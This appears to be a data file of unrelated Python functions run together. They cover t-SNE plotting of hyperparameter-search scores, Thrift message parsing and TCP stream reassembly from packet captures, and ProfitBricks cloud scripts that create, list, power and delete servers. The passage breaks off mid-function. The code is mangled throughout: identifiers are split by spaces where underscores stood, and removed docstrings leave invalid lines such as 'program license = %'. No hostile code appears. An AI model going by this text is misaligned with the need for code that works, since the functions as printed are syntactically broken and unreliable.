def plot 3 ( data , ss , * args ) : if len ( data ) <= 1 : warnings . warn ( "Only one datapoint. Could not compute t-SNE embedding." ) return None scores = np . array ( [ d [ 'mean test score' ] for d in data ] ) # maps each parameters to a vector of floats warped = np . array ( [ ss . point to unit ( d [ 'parameters' ] ) for d in data ] ) # Embed into 2 dimensions with t-SNE X = TSNE ( n components = 2 ) . fit transform ( warped ) e scores = np . exp ( scores ) mine , maxe = np . min ( e scores ) , np . max ( e scores ) color = ( e scores - mine ) / ( maxe - mine ) mapped colors = list ( map ( rgb2hex , cm . get cmap ( 'Rd Bu r' ) ( color ) ) ) p = bk . figure ( title = 't-SNE (unsupervised)' , tools = TOOLS ) df params = nonconstant parameters ( data ) df params [ 'score' ] = scores df params [ 'x' ] = X [ : , 0 ] df params [ 'y' ] = X [ : , 1 ] df params [ 'color' ] = mapped colors df params [ 'radius' ] = 1 p . circle ( x = 'x' , y = 'y' , color = 'color' , radius = 'radius' , source = Column Data Source ( data = df params ) , fill alpha = 0.6 , line color = None ) cp = p hover = cp . select ( dict ( type = Hover Tool ) ) format tt = [ ( s , '@%s' % s ) for s in df params . columns ] hover . tooltips = Ordered Dict ( [ ( "index" , "$index" ) ] + format tt ) xax , yax = p . axis xax . axis label = 't-SNE coord 1' yax . axis label = 't-SNE coord 2' return p
def plot 4 ( data , * args ) : params = nonconstant parameters ( data ) scores = np . array ( [ d [ 'mean test score' ] for d in data ] ) order = np . argsort ( scores ) for key in params . keys ( ) : if params [ key ] . dtype == np . dtype ( 'bool' ) : params [ key ] = params [ key ] . astype ( np . int ) p list = [ ] for key in params . keys ( ) : x = params [ key ] [ order ] y = scores [ order ] params = params . loc [ order ] try : radius = ( np . max ( x ) - np . min ( x ) ) / 100.0 except : print ( "error making plot4 for '%s'" % key ) continue p list . append ( build scatter tooltip ( x = x , y = y , radius = radius , add line = False , tt = params , xlabel = key , title = 'Score vs %s' % key ) ) return p list
def get ip packet ( data , client port , server port , is loopback = False ) : header = loopback if is loopback else ethernet try : header . unpack ( data ) except Exception as ex : raise Value Error ( 'Bad header: %s' % ex ) tcp p = getattr ( header . data , 'data' , None ) if type ( tcp p ) != dpkt . tcp . TCP : raise Value Error ( 'Not a TCP packet' ) if tcp p . dport == server port : if client port != 0 and tcp p . sport != client port : raise Value Error ( 'Request from different client' ) elif tcp p . sport == server port : if client port != 0 and tcp p . dport != client port : raise Value Error ( 'Reply for different client' ) else : raise Value Error ( 'Packet not for/from client/server' ) return header . data
def report ( self ) : self . output . write ( '\r' ) sort by = 'avg' results = { } for key , latencies in self . latencies by method . items ( ) : result = { } result [ 'count' ] = len ( latencies ) result [ 'avg' ] = sum ( latencies ) / len ( latencies ) result [ 'min' ] = min ( latencies ) result [ 'max' ] = max ( latencies ) latencies = sorted ( latencies ) result [ 'p90' ] = percentile ( latencies , 0.90 ) result [ 'p95' ] = percentile ( latencies , 0.95 ) result [ 'p99' ] = percentile ( latencies , 0.99 ) result [ 'p999' ] = percentile ( latencies , 0.999 ) results [ key ] = result headers = [ 'method' , 'count' , 'avg' , 'min' , 'max' , 'p90' , 'p95' , 'p99' , 'p999' ] data = [ ] results = sorted ( results . items ( ) , key = lambda it : it [ 1 ] [ sort by ] , reverse = True ) def row ( key , res ) : data = [ key ] + [ res [ header ] for header in headers [ 1 : ] ] return tuple ( data ) data = [ row ( key , result ) for key , result in results ] self . output . write ( '%s\n' % tabulate ( data , headers = headers ) ) self . output . flush ( )
def of structs ( cls , a , b ) : t diff = Thrift Diff ( a , b ) t diff . do diff ( ) return t diff
def read ( cls , data , protocol = None , fallback protocol = T Binary Protocol , finagle thrift = False , max fields = MAX FIELDS , max list size = MAX LIST SIZE , max map size = MAX MAP SIZE , max set size = MAX SET SIZE , read values = False ) : # do we have enough data? if len ( data ) < cls . MIN MESSAGE SIZE : raise Value Error ( 'not enough data' ) if protocol is None : protocol = cls . detect protocol ( data , fallback protocol ) trans = T Transport . T Memory Buffer ( data ) proto = protocol ( trans ) # finagle-thrift prepends a Request Header # # See: http://git.io/vszi G header = None if finagle thrift : try : header = Thrift Struct . read ( proto , max fields , max list size , max map size , max set size , read values ) except : # reset stream, maybe it's not finagle-thrift trans = T Transport . T Memory Buffer ( data ) proto = protocol ( trans ) # unpack the message method , mtype , seqid = proto . read Message Begin ( ) mtype = cls . message type to str ( mtype ) if len ( method ) == 0 or method . isspace ( ) or method . startswith ( ' ' ) : raise Value Error ( 'no method name' ) if len ( method ) > cls . MAX METHOD LENGTH : raise Value Error ( 'method name too long' ) # we might have made it until this point by mere chance, so filter out # suspicious method names valid = range ( 33 , 127 ) if any ( ord ( char ) not in valid for char in method ) : raise Value Error ( 'invalid method name' % method ) args = Thrift Struct . read ( proto , max fields , max list size , max map size , max set size , read values ) proto . read Message End ( ) # Note: this is a bit fragile, the right thing would be to count bytes # as we read them (i.e.: when calling read I32, etc). msglen = trans . buffer . tell ( ) return cls ( method , mtype , seqid , args , header , msglen ) , msglen
def pop ( self , nbytes ) : size = 0 popped = [ ] with self . lock packets : while size < nbytes : try : packet = self . packets . pop ( 0 ) size += len ( packet . data . data ) self . remaining -= len ( packet . data . data ) popped . append ( packet ) except Index Error : break return popped
def pop data ( self , nbytes ) : last timestamp = 0 data = [ ] for packet in self . pop ( nbytes ) : last timestamp = packet . timestamp data . append ( packet . data . data ) return '' . join ( data ) , last timestamp
def push ( self , ip packet ) : data len = len ( ip packet . data . data ) seq id = ip packet . data . seq if data len == 0 : self . next seq id = seq id return False # have we seen this packet? if self . next seq id != - 1 and seq id != self . next seq id : return False self . next seq id = seq id + data len with self . lock packets : # Note: we only account for payload (i.e.: tcp data) self . length += len ( ip packet . data . data ) self . remaining += len ( ip packet . data . data ) self . packets . append ( ip packet ) return True
def run ( self , * args , * * kwargs ) : while True : try : timestamp , ip p = self . queue . popleft ( ) src ip = get ip ( ip p , ip p . src ) dst ip = get ip ( ip p , ip p . dst ) src = intern ( '%s:%s' % ( src ip , ip p . data . sport ) ) dst = intern ( '%s:%s' % ( dst ip , ip p . data . dport ) ) key = intern ( '%s<->%s' % ( src , dst ) ) stream = self . streams . get ( key ) if stream is None : stream = Stream ( src , dst ) self . streams [ key ] = stream # HACK: save the timestamp setattr ( ip p , 'timestamp' , timestamp ) pushed = stream . push ( ip p ) if not pushed : continue # let listeners know about the updated stream for handler in self . handlers : try : handler ( stream ) except Exception as ex : print ( 'handler exception: %s' % ex ) except Exception : time . sleep ( 0.00001 )
def main ( argv = None ) : if argv is None : argv = sys . argv else : sys . argv . extend ( argv ) program name = os . path . basename ( sys . argv [ 0 ] ) program version = "v%s" % version program build date = str ( updated ) program version message = '%%(prog)s %s (%s)' % ( program version , program build date ) program shortdesc = import ( ' main ' ) . doc . split ( "\n" ) [ 1 ] program license = % ( program shortdesc , str ( date ) ) try : # Setup argument parser parser = Argument Parser ( description = program license , formatter class = Raw Description Help Formatter ) parser . add argument ( '-u' , '--user' , dest = 'user' , help = 'the login name' ) parser . add argument ( '-p' , '--password' , dest = 'password' , help = 'the login password' ) parser . add argument ( '-L' , '--Login' , dest = 'loginfile' , default = None , help = 'the login file to use' ) parser . add argument ( '-t' , '--type' , dest = 'metatype' , default = "OVF" , help = 'type of VM meta data' ) parser . add argument ( '-m' , '--metadata' , dest = 'metafile' , required = True , default = None , help = 'meta data file' ) parser . add argument ( '-d' , '--datacenterid' , dest = 'datacenterid' , default = None , help = 'datacenter of the new server' ) parser . add argument ( '-D' , '--D Cname' , dest = 'dcname' , default = None , help = 'new datacenter name' ) parser . add argument ( '-l' , '--location' , dest = 'location' , default = None , help = 'location for new datacenter' ) parser . add argument ( '-v' , '--verbose' , dest = "verbose" , action = "count" , default = 0 , help = "set verbosity level [default: %(default)s]" ) parser . add argument ( '-V' , '--version' , action = 'version' , version = program version message ) # Process arguments args = parser . parse args ( ) global verbose verbose = args . verbose if verbose > 0 : print ( "Verbose mode on" ) print ( "start {} with args {}" . format ( program name , str ( args ) ) ) ( user , password ) = get Login ( args . loginfile , args . user , args . password ) if user is None or password is None : raise Value Error ( "user or password resolved to None" ) pbclient = Profit Bricks Service ( user , password ) if args . metatype == 'OVF' : metadata = OFV Data ( args . metafile ) metadata . parse ( ) else : sys . stderr . write ( "Metadata type '{}' is not supported" . format ( args . metatype ) ) return 1 # we need the DC first to have the location defined dc id = None if args . datacenterid is None : if args . dcname is None or args . location is None : sys . stderr . write ( "Either '-d <id>' or '-D <name> -l <loc>'  must be specified" ) return 1 # else: we will create the DC later after parsing the meta data else : dc id = args . datacenterid if dc id is None : location = args . location dc = Datacenter ( name = args . dcname , location = location , description = "created by pb import VM" ) print ( "create new DC {}" . format ( str ( dc ) ) ) response = pbclient . create datacenter ( dc ) dc id = response [ 'id' ] result = wait for request ( pbclient , response [ 'request Id' ] ) print ( "wait loop returned {}" . format ( result ) ) else : dc = pbclient . get datacenter ( dc id ) location = dc [ 'properties' ] [ 'location' ] print ( "use existing DC {} in location {}" . format ( dc [ 'properties' ] [ 'name' ] , location ) ) # check if images exist for disk in metadata . disks : disk name = disk [ 'file' ] images = get disk image by name ( pbclient , location , disk name ) if not images : raise Value Error ( "No HDD image with name '{}' found in location {}" . format ( disk name , location ) ) if len ( images ) > 1 : raise Value Error ( "Ambigous image name '{}' in location {}" . format ( disk name , location ) ) disk [ 'image' ] = images [ 0 ] [ 'id' ] # now we're ready to create the VM # Server server = Server ( name = metadata . name , cores = metadata . cpus , ram = metadata . ram ) print ( "create server {}" . format ( str ( Server ) ) ) response = pbclient . create server ( dc id , server ) srv id = response [ 'id' ] result = wait for request ( pbclient , response [ 'request Id' ] ) print ( "wait loop returned {}" . format ( str ( result ) ) ) # NI Cs (note that createing LA Ns may be implicit) for nic in metadata . nics : dcnic = NIC ( name = nic [ 'nic' ] , lan = nic [ 'lanid' ] ) print ( "create NIC {}" . format ( str ( dcnic ) ) ) response = pbclient . create nic ( dc id , srv id , dcnic ) nic id = response [ 'id' ] result = wait for request ( pbclient , response [ 'request Id' ] ) print ( "wait loop returned {}" . format ( str ( result ) ) ) response = pbclient . get nic ( dc id , srv id , nic id , 2 ) mac = response [ 'properties' ] [ 'mac' ] print ( "dcnic has MAC {} for {}" . format ( mac , nic id ) ) # end for(nics) # Volumes (we use the image name as volume name too requests = [ ] for disk in metadata . disks : dcvol = Volume ( name = disk [ 'file' ] , size = disk [ 'capacity' ] , image = disk [ 'image' ] , licence type = metadata . license Type ) print ( "create Volume {}" . format ( str ( dcvol ) ) ) response = pbclient . create volume ( dc id , dcvol ) requests . append ( response [ 'request Id' ] ) disk [ 'volume id' ] = response [ 'id' ] # end for(disks) if requests : result = wait for requests ( pbclient , requests , initial wait = 10 , scaleup = 15 ) print ( "wait loop returned {}" . format ( str ( result ) ) ) for disk in metadata . disks : print ( "attach volume {}" . format ( disk ) ) response = pbclient . attach volume ( dc id , srv id , disk [ 'volume id' ] ) result = wait for request ( pbclient , response [ 'request Id' ] ) print ( "wait loop returned {}" . format ( str ( result ) ) ) # end for(disks) print ( "import of VM succesfully finished" ) return 0 except Keyboard Interrupt : # handle keyboard interrupt return 0 except Exception : traceback . print exc ( ) sys . stderr . write ( "\n" + program name + ":  for help use --help\n" ) return 2
def read config ( self , filename = None ) : if filename : self . config filename = filename else : try : import appdirs except Import Error : raise Exception ( "Missing dependency for determining config path. Please install " "the 'appdirs' Python module." ) self . config filename = appdirs . user config dir ( LIBRARY NAME , "Profit Bricks" ) + ".ini" if not self . config : self . config = configparser . Config Parser ( ) self . config . optionxform = str self . config . read ( self . config filename )
def save config ( self , filename = None ) : if filename is None : filename = self . config filename parent path = os . path . dirname ( filename ) if not os . path . isdir ( parent path ) : os . makedirs ( parent path ) with open ( filename , "w" ) as configfile : self . config . write ( configfile )
def create datacenter ( self , datacenter ) : server items = [ ] volume items = [ ] lan items = [ ] loadbalancer items = [ ] entities = dict ( ) properties = { "name" : datacenter . name } # Omit 'location', if not provided, to receive # a meaningful error message. if datacenter . location : properties [ 'location' ] = datacenter . location # Optional Properties if datacenter . description : properties [ 'description' ] = datacenter . description # Servers if datacenter . servers : for server in datacenter . servers : server items . append ( self . create server dict ( server ) ) servers = { "items" : server items } server entities = { "servers" : servers } entities . update ( server entities ) # Volumes if datacenter . volumes : for volume in datacenter . volumes : volume items . append ( self . create volume dict ( volume ) ) volumes = { "items" : volume items } volume entities = { "volumes" : volumes } entities . update ( volume entities ) # Load Balancers if datacenter . loadbalancers : for loadbalancer in datacenter . loadbalancers : loadbalancer items . append ( self . create loadbalancer dict ( loadbalancer ) ) loadbalancers = { "items" : loadbalancer items } loadbalancer entities = { "loadbalancers" : loadbalancers } entities . update ( loadbalancer entities ) # LA Ns if datacenter . lans : for lan in datacenter . lans : lan items . append ( self . create lan dict ( lan ) ) lans = { "items" : lan items } lan entities = { "lans" : lans } entities . update ( lan entities ) if not entities : raw = { "properties" : properties , } else : raw = { "properties" : properties , "entities" : entities } data = json . dumps ( raw ) response = self . perform request ( url = '/datacenters' , method = 'POST' , data = data ) return response
def update image ( self , image id , * * kwargs ) : data = { } for attr , value in kwargs . items ( ) : data [ self . underscore to camelcase ( attr ) ] = value response = self . perform request ( url = '/images/' + image id , method = 'PATCH' , data = json . dumps ( data ) ) return response
def reserve ipblock ( self , ipblock ) : properties = { "name" : ipblock . name } if ipblock . location : properties [ 'location' ] = ipblock . location if ipblock . size : properties [ 'size' ] = str ( ipblock . size ) raw = { "properties" : properties , } response = self . perform request ( url = '/ipblocks' , method = 'POST' , data = json . dumps ( raw ) ) return response
def underscore to camelcase ( value ) : def camelcase ( ) : yield str . lower while True : yield str . capitalize c = camelcase ( ) return "" . join ( next ( c ) ( x ) if x else ' ' for x in value . split ( " " ) )
def get Server Info ( pbclient = None , dc id = None ) : if pbclient is None : raise Value Error ( "argument 'pbclient' must not be None" ) if dc id is None : raise Value Error ( "argument 'dc id' must not be None" ) # list of all found server's info server info = [ ] # depth 1 is enough for props/meta servers = pbclient . list servers ( dc id , 1 ) for server in servers [ 'items' ] : props = server [ 'properties' ] info = dict ( id = server [ 'id' ] , name = props [ 'name' ] , state = server [ 'metadata' ] [ 'state' ] , vmstate = props [ 'vm State' ] ) server info . append ( info ) # end for(servers) return server info
def get Server States ( pbclient = None , dc id = None , serverid = None , servername = None ) : if pbclient is None : raise Value Error ( "argument 'pbclient' must not be None" ) if dc id is None : raise Value Error ( "argument 'dc id' must not be None" ) server = None if serverid is None : if servername is None : raise Value Error ( "one of 'serverid' or 'servername' must be specified" ) # so, arg.servername is set (to whatever) server info = select where ( get Server Info ( pbclient , dc id ) , [ 'id' , 'name' , 'state' , 'vmstate' ] , name = servername ) if len ( server info ) > 1 : raise Name Error ( "ambiguous server name '{}'" . format ( servername ) ) if len ( server info ) == 1 : server = server info [ 0 ] else : # get by ID may also fail if it's removed # in this case, catch exception (message 404) and be quiet for a while # unfortunately this has changed from Py2 to Py3 try : server info = pbclient . get server ( dc id , serverid , 1 ) server = dict ( id = server info [ 'id' ] , name = server info [ 'properties' ] [ 'name' ] , state = server info [ 'metadata' ] [ 'state' ] , vmstate = server info [ 'properties' ] [ 'vm State' ] ) except Exception : ex = sys . exc info ( ) [ 1 ] if ex . args [ 0 ] is not None and ex . args [ 0 ] == 404 : print ( "Server w/ ID {} not found" . format ( serverid ) ) server = None else : raise ex # end try/except # end if/else(serverid) return server
def main ( argv = None ) : if argv is None : argv = sys . argv else : sys . argv . extend ( argv ) program name = os . path . basename ( sys . argv [ 0 ] ) program version = "v%s" % version program build date = str ( updated ) program version message = '%%(prog)s %s (%s)' % ( program version , program build date ) program shortdesc = import ( ' main ' ) . doc . split ( "\n" ) [ 1 ] program license = % ( program shortdesc , str ( date ) ) try : # Setup argument parser parser = Argument Parser ( description = program license , formatter class = Raw Description Help Formatter ) parser . add argument ( '-u' , '--user' , dest = 'user' , help = 'the login name' ) parser . add argument ( '-p' , '--password' , dest = 'password' , help = 'the login password' ) parser . add argument ( '-L' , '--Login' , dest = 'loginfile' , default = None , help = 'the login file to use' ) parser . add argument ( '-d' , '--datacenterid' , dest = 'dc id' , required = True , default = None , help = 'datacenter of the server' ) parser . add argument ( '-s' , '--serverid' , dest = 'serverid' , default = None , help = 'ID of the server' ) parser . add argument ( '-n' , '--name' , dest = 'servername' , default = None , help = 'name of the server' ) parser . add argument ( '-C' , '--command' , dest = 'command' , default = None , help = 'remote shell command to use for shutdown' ) parser . add argument ( '-v' , '--verbose' , dest = "verbose" , action = "count" , help = "set verbosity level [default: %(default)s]" ) parser . add argument ( '-V' , '--version' , action = 'version' , version = program version message ) # Process arguments args = parser . parse args ( ) global verbose verbose = args . verbose dc id = args . dc id if verbose > 0 : print ( "Verbose mode on" ) if args . serverid is None and args . servername is None : parser . error ( "one of 'serverid' or 'name' must be specified" ) ( user , password ) = get Login ( args . loginfile , args . user , args . password ) if user is None or password is None : raise Value Error ( "user or password resolved to None" ) pbclient = Profit Bricks Service ( user , password ) server = get Server States ( pbclient , dc id , args . serverid , args . servername ) if server is None : raise Exception ( 1 , "specified server not found" ) print ( "using server {}(id={}) in state {}, {}" . format ( server [ 'name' ] , server [ 'id' ] , server [ 'state' ] , server [ 'vmstate' ] ) ) # ! stop/start/reboot server() simply return 'True' ! # this implies, that there's NO response nor request Id to track! if server [ 'vmstate' ] == 'SHUTOFF' : print ( "VM is already shut off" ) else : if args . command is None : print ( "no command specified for shutdown of VM" ) else : print ( "executing {}" . format ( args . command ) ) cmdrc = call ( args . command , shell = True ) print ( "executing {} returned {}" . format ( args . command , cmdrc ) ) server = wait for server ( pbclient , dc id , server [ 'id' ] , indicator = 'vmstate' , state = 'SHUTOFF' , timeout = 300 ) # first we have to delete all attached volumes volumes = pbclient . get attached volumes ( dc id , server [ 'id' ] , 0 ) for vol in volumes [ 'items' ] : print ( "deleting volume {} of server {}" . format ( vol [ 'id' ] , server [ 'name' ] ) ) pbclient . delete volume ( dc id , vol [ 'id' ] ) pbclient . delete server ( dc id , server [ 'id' ] ) wait for datacenter ( pbclient , dc id ) except Keyboard Interrupt : # handle keyboard interrupt # pass except Exception : traceback . print exc ( ) sys . stderr . write ( "\n" + program name + ":  for help use --help\n" ) return 2 return 0
def main ( argv = None ) : if argv is None : argv = sys . argv else : sys . argv . extend ( argv ) program name = os . path . basename ( sys . argv [ 0 ] ) program version = "v%s" % version program build date = str ( updated ) program version message = '%%(prog)s %s (%s)' % ( program version , program build date ) program shortdesc = import ( ' main ' ) . doc . split ( "\n" ) [ 1 ] program license = % ( program shortdesc , str ( date ) ) try : # Setup argument parser parser = Argument Parser ( description = program license , formatter class = Raw Description Help Formatter ) parser . add argument ( '-u' , '--user' , dest = 'user' , help = 'the login name' ) parser . add argument ( '-p' , '--password' , dest = 'password' , help = 'the login password' ) parser . add argument ( '-L' , '--Login' , dest = 'loginfile' , default = None , help = 'the login file to use' ) parser . add argument ( '-d' , '--datacenterid' , dest = 'dc id' , required = True , default = None , help = 'datacenter of the server' ) parser . add argument ( '-s' , '--serverid' , dest = 'serverid' , default = None , help = 'ID of the server' ) parser . add argument ( '-n' , '--name' , dest = 'servername' , default = None , help = 'name of the server' ) parser . add argument ( '-a' , '--action' , dest = 'action' , default = None , required = True , help = 'what to do with the server' ) parser . add argument ( '-C' , '--command' , dest = 'command' , default = None , help = 'remote shell command to use for shutdown' ) parser . add argument ( '-v' , '--verbose' , dest = "verbose" , action = "count" , help = "set verbosity level [default: %(default)s]" ) parser . add argument ( '-V' , '--version' , action = 'version' , version = program version message ) # Process arguments args = parser . parse args ( ) global verbose verbose = args . verbose dc id = args . dc id if verbose > 0 : print ( "Verbose mode on" ) # normalize action action = args . action . upper ( ) actions = set ( [ 'POWERON' , 'POWEROFF' , 'START' , 'SHUTOFF' ] ) if action not in actions : parser . error ( "action must be on of {}" . format ( str ( actions ) ) ) if args . serverid is None and args . servername is None : parser . error ( "one of 'serverid' or 'name' must be specified" ) ( user , password ) = get Login ( args . loginfile , args . user , args . password ) if user is None or password is None : raise Value Error ( "user or password resolved to None" ) pbclient = Profit Bricks Service ( user , password ) server = get Server States ( pbclient , dc id , args . serverid , args . servername ) if server is None : raise Exception ( 1 , "specified server not found" ) print ( "using server {}(id={}) in state {}, {}" . format ( server [ 'name' ] , server [ 'id' ] , server [ 'state' ] , server [ 'vmstate' ] ) ) # !!! stop/start/reboot server() simply return 'True' !!! # this implies, that there's NO response nor request Id to track! if action == 'POWEROFF' : if server [ 'state' ] == 'INACTIVE' : print ( "server is already powered off" ) else : # currently use 'forced' poweroff if server [ 'vmstate' ] != 'SHUTOFF' : print ( "VM is in state {}, {} may lead to inconsistent state" . format ( server [ 'vmstate' ] , action ) ) if args . command is None : print ( "no command specified for shutdown of VM" ) else : print ( "executing {}" . format ( args . command ) ) cmdrc = call ( args . command , shell = True ) print ( "executing {} returned {}" . format ( args . command , cmdrc ) ) pbclient . stop server ( dc id , server [ 'id' ] ) server = wait for server ( pbclient , dc id , server [ 'id' ] , state = 'INACTIVE' , timeout = 300 ) elif action == 'POWERON' : if server [ 'vmstate' ] == 'RUNNING' : print ( "VM is already up and running" ) else : pbclient . start server ( dc id , server [ 'id' ] ) server = wait for server ( pbclient , dc id , server [ 'id' ] , indicator = 'vmstate' , state = 'RUNNING' , timeout = 300 ) elif action == 'START' : # this is the same as POWERON if server [ 'vmstate' ] == 'RUNNING' : print ( "VM is already up and running" ) else : pbclient . start server ( dc id , server [ 'id' ] ) server = wait for server ( pbclient , dc id , server [ 'id' ] , indicator = 'vmstate' , state = 'RUNNING' , timeout = 300 ) elif action == 'SHUTOFF' : if server [ 'vmstate' ] == 'SHUTOFF' : print ( "VM is already shut off" ) else : if args . command is None : print ( "no command specified for shutdown of VM" ) else : print ( "executing {}" . format ( args . command ) ) cmdrc = call ( args . command , shell = True ) print ( "executing {} returned {}" . format ( args . command , cmdrc ) ) server = wait for server ( pbclient , dc id , server [ 'id' ] , indicator = 'vmstate' , state = 'SHUTOFF' , timeout = 300 ) # end if/else(action) print ( "server {}(id={}) now in state {}, {}" . format ( server [ 'name' ] , server [ 'id' ] , server [ 'state' ] , server [ 'vmstate' ] ) ) except Keyboard Interrupt : # handle keyboard interrupt # pass except Exception : traceback . print exc ( ) sys . stderr . write ( "\n" + program name + ":  for help use --help\n" ) return 2 return 0
def get dc inventory ( pbclient , dc = None ) : if pbclient is None : raise Value Error ( "argument 'pbclient' must not be None" ) if dc is None : raise Value Error ( "argument 'dc' must not be None" ) dc inv = [ ] # inventory list to return dcid = dc [ 'id' ] # dc data contains dc specific columns dc data = [ dcid , dc [ 'properties' ] [ 'name' ] , dc [ 'properties' ] [ 'location' ] ] # first get the servers # this will build a hash to relate volumes to servers later # depth 3 is enough to get into volume/nic level plus details servers = pbclient . list servers ( dcid , 3 ) print ( "found %i servers in data center %s" % ( len ( servers [ 'items' ] ) , dc [ 'properties' ] [ 'name' ] ) ) if verbose > 2 : print ( str ( servers ) ) # this will build a hash to relate volumes to servers later bound vols = dict ( ) # hash volume-to-server relations for server in servers [ 'items' ] : if verbose > 2 : print ( "SERVER: %s" % str ( server ) ) serverid = server [ 'id' ] # server data contains server specific columns for later output server data = [ server [ 'type' ] , serverid , server [ 'properties' ] [ 'name' ] , server [ 'metadata' ] [ 'state' ] ] # OS is determined by boot device (volume||cdrom), not a server property. # Might even be unspecified boot OS = "NONE" bootdev = server [ 'properties' ] [ 'boot Volume' ] if bootdev is None : bootdev = server [ 'properties' ] [ 'boot Cdrom' ] print ( "server %s has boot device %s" % ( serverid , "CDROM" ) ) if bootdev is None : print ( "server %s has NO boot device" % ( serverid ) ) else : boot OS = bootdev [ 'properties' ] [ 'licence Type' ] server data += [ boot OS , server [ 'properties' ] [ 'cores' ] , server [ 'properties' ] [ 'ram' ] ] server vols = server [ 'entities' ] [ 'volumes' ] [ 'items' ] n volumes = len ( server vols ) total disk = 0 licence type = "" for vol in server vols : total disk += vol [ 'properties' ] [ 'size' ] licence type = str ( vol [ 'properties' ] [ 'licence Type' ] ) bound vols [ vol [ 'id' ] ] = serverid if verbose : print ( "volume %s is connected to %s w/ OS %s" % ( vol [ 'id' ] , bound vols [ vol [ 'id' ] ] , licence type ) ) server nics = server [ 'entities' ] [ 'nics' ] [ 'items' ] n nics = len ( server nics ) server data += [ n nics , n volumes , total disk , "" , server [ 'metadata' ] [ 'created Date' ] , server [ 'metadata' ] [ 'last Modified Date' ] ] dc inv . append ( dc data + server data ) # end for(servers) # and now the volumes... volumes = pbclient . list volumes ( dcid , 2 ) # depth 2 gives max. details for volume in volumes [ 'items' ] : if verbose > 2 : print ( "VOLUME: %s" % str ( volume ) ) volid = volume [ 'id' ] vol data = [ volume [ 'type' ] , volid , volume [ 'properties' ] [ 'name' ] , volume [ 'metadata' ] [ 'state' ] , volume [ 'properties' ] [ 'licence Type' ] , "" , "" , "" , "" , volume [ 'properties' ] [ 'size' ] ] connect = 'NONE' if volid in bound vols : connect = bound vols [ volid ] vol data += [ connect , volume [ 'metadata' ] [ 'created Date' ] , volume [ 'metadata' ] [ 'last Modified Date' ] ] dc inv . append ( dc data + vol data ) # end for(volumes) return dc inv
def get dc network ( pbclient , dc = None ) : if pbclient is None : raise Value Error ( "argument 'pbclient' must not be None" ) if dc is None : raise Value Error ( "argument 'dc' must not be None" ) print ( "getting networks.." ) dcid = dc [ 'id' ] # dc data contains dc specific columns dc data = [ dcid , dc [ 'properties' ] [ 'name' ] , dc [ 'properties' ] [ 'location' ] ] lbs = pbclient . list loadbalancers ( dcid , 2 ) # build lookup hash for loadbalancer's ID->name lbnames = dict ( [ ( lb [ 'id' ] , lb [ 'properties' ] [ 'name' ] ) for lb in lbs [ 'items' ] ] ) if verbose > 2 : print ( "L Bs: %s" % ( str ( lbs ) ) ) lans = pbclient . list lans ( dcid , 3 ) lan inv = [ ] # lookup hash for server's ID->name servernames = dict ( ) for lan in lans [ 'items' ] : if verbose > 1 : print ( "LAN: %s" % str ( lan ) ) lan data = dc data + [ "LAN " + lan [ 'id' ] , lan [ 'properties' ] [ 'name' ] , lan [ 'properties' ] [ 'public' ] , lan [ 'metadata' ] [ 'state' ] ] nics = lan [ 'entities' ] [ 'nics' ] [ 'items' ] lan data . append ( len ( nics ) ) if nics : for nic in nics : nic props = nic [ 'properties' ] # get the serverid of this nic by href # !!! HUUUUH this might also be a loadbalancer ID, # although it's '/servers/<id>/...' !!! serverid = re . sub ( r'^.*servers/([^/]+)/nics.*' , r'\1' , nic [ 'href' ] ) if serverid in lbnames : servertype = "LB" servername = lbnames [ serverid ] print ( "server entry for %s is LOADBALANCER %s" % ( serverid , servername ) ) else : servertype = "Server" if serverid not in servernames : if verbose : print ( "add server entry for %s" % serverid ) server = pbclient . get server ( dcid , serverid , 0 ) servernames [ serverid ] = server [ 'properties' ] [ 'name' ] servername = servernames [ serverid ] # end if/else(serverid) ips = [ str ( ip ) for ip in nic props [ 'ips' ] ] nic data = [ nic [ 'id' ] , nic props [ 'mac' ] , nic props [ 'dhcp' ] , ips , nic props [ 'name' ] , nic props [ 'firewall Active' ] , servertype , serverid , servername ] lan inv . append ( lan data + nic data ) # end for(nics) else : lan inv . append ( lan data ) # end for(lans) return lan inv
def main ( argv = None ) : # IGNORE:C0111 if argv is None : argv = sys . argv else : sys . argv . extend ( argv ) program name = os . path . basename ( sys . argv [ 0 ] ) program version = "v%s" % version program build date = str ( updated ) program version message = '%%(prog)s %s (%s)' % ( program version , program build date ) program shortdesc = import ( ' main ' ) . doc . split ( "\n" ) [ 1 ] program license = % ( program shortdesc , str ( date ) ) try : # Setup argument parser parser = Argument Parser ( description = program license , formatter class = Raw Description Help Formatter ) parser . add argument ( '-u' , '--user' , dest = 'user' , required = True , help = 'the login name' ) parser . add argument ( '-p' , '--password' , dest = 'password' , help = 'the login password' ) parser . add argument ( '-d' , '--datacenter' , '--datacenterid' , dest = 'datacenterid' , nargs = '?' , const = '*' , help = 'show server/storage of datacenter(s)' ) parser . add argument ( '-i' , '--image' , dest = 'show images' , action = "store true" , help = 'show images and snapshots' ) parser . add argument ( '-b' , '--ipblock' , dest = 'show ipblocks' , action = "store true" , help = 'show reserved IP blocks' ) parser . add argument ( '-n' , '--network' , dest = 'show networks' , action = "store true" , help = 'show network assignments' ) #        parser.add argument( #            '-r', '--request', dest='show requests', action="store true", #            help='show requests') parser . add argument ( "-v" , "--verbose" , dest = "verbose" , action = "count" , default = 0 , help = "set verbosity level [default: %(default)s]" ) parser . add argument ( '-V' , '--version' , action = 'version' , version = program version message ) # Process arguments args = parser . parse args ( ) global verbose verbose = args . verbose # this is a global to be used in methods user = args . user password = args . password datacenterid = args . datacenterid print ( "Welcome to PB-API %s\n" % user ) if password is None : password = getpass ( ) if verbose > 0 : print ( "Verbose mode on" ) print ( "using python " , sys . version info ) pbclient = Profit Bricks Service ( user , password ) if datacenterid is not None : datacenters = { } if datacenterid == '*' : # the default depth=1 is sufficient, higher values don't provide more details datacenters = pbclient . list datacenters ( ) else : datacenters [ 'items' ] = [ ] datacenters [ 'items' ] = [ pbclient . get datacenter ( datacenterid , 1 ) ] if verbose > 1 : print ( pp ( datacenters ) ) print ( "retrieved %i datacenters " % len ( datacenters [ 'items' ] ) ) # dump inventory to file with open ( "pb datacenter inventory.csv" , 'w' ) as csvfile : csvwriter = csv . writer ( csvfile , delimiter = ';' , lineterminator = '\n' ) csvwriter . writerow ( [ 'DCID' , 'DC Name' , 'Loc' , 'Rsc Type' , 'Rsc ID' , 'Rsc Name' , 'State' , 'Lic Type' , 'Cores' , 'RAM' , '# NI Cs' , '# Volumes' , '(Total) Storage' , 'Connected to' , 'Created' , 'Modified' ] ) for dc in datacenters [ 'items' ] : try : dc inv = get dc inventory ( pbclient , dc ) if verbose : print ( "DC %s has %i inventory entries" % ( dc 